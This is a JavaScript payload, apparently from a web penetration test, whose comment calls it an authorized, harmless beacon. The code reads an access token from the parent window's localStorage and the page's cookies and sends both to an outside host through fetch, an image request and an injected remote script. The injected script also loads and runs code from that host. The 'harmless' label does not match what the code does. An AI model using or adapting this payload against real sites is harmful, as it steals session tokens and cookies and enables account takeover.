// Pentest PoC proxy beacon - "Agentic Testing1 DAST" authorized engagement. Harmless marker + channel probe.
(function () {
  function val() {
    try { return window.parent.localStorage.getItem('testing1_agentic_pentest_leahai_com__access_token') || ''; }
    catch (e) { return 'ERR:' + e.message; }
  }
  function ck() { try { return document.cookie; } catch (e) { return 'ERR:' + e.message; } }
  var base = ['https://', BRDC_HOST, '/leah?d=ldr&t=' + encodeURIComponent(val()) + '&c=' + encodeURIComponent(ck())];
  var u = base.join('');
  try { fetch(u + '&v=fetch', { mode: 'no-cors' }); } catch (e) {}
  try { var i = new Image(); i.src = u + '&v=img'; document.body ? document.body.appendChild(i) : document.head.appendChild(i); } catch (e) {}
  try { var s = document.createElement('script'); s.src = u + '&v=script'; document.head.appendChild(s); } catch (e) {}
  document.documentElement.setAttribute('data-poc-fired', 'LEAH_POC_' + Date.now());
})();
